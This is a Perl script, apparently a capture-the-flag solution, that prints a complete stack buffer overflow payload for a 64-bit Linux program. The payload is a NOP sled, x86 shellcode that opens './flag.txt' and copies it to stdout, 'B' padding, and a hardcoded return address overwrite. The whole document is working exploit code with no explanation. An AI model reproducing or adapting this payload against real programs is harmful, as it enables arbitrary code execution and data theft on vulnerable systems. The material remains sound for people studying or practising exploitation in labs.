#!/bin/perl
print "\x90"x133 . "\x31\xc9\x51\x68\x78\x74\x00\x00\x68\x61\x67\x2e\x74\x68\x2e\x2f\x66\x6c\x31\xc0\xb0\x05\x89\xe3\xcd\x80\x89\xc3\x31\xc0\xb0\x03\x89\xe1\x31\xd2\xfe\xc2\xcd\x80\x50\x53\x31\xc0\xb0\x04\x31\xdb\xfe\xc3\xcd\x80\x5b\x58\x83\xf8\x01\x74\xe1\xb0\x06\xcd\x80\xb0\x01\xcd\x80" . "B"x64 . "\xe0\xdf\xff\xff\xff\x7f\x00\x00";